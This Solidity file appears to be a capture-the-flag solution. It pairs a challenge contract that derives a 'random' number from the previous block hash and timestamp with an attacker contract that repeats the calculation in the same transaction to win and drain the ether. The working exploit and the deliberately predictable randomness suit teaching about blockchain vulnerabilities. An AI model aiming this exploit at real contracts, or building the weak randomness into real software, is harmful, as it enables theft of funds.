// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberSolution {
    GuessTheNewNumberChallenge public chContract;
    
    function GuessTheNewNumberSolution(address chAddress) public payable {
        chContract = GuessTheNewNumberChallenge(chAddress);
    }

    function solve() external payable {
      require(address(this).balance >= 1 ether);
    //   doing the exact same computation to get the same number here
      uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
      chContract.guess.value(1 ether)(answer);

      require(chContract.isComplete());
    //   trasnferring all the values back to the caller
      msg.sender.transfer(address(this).balance);
    }

    function () public payable {}
}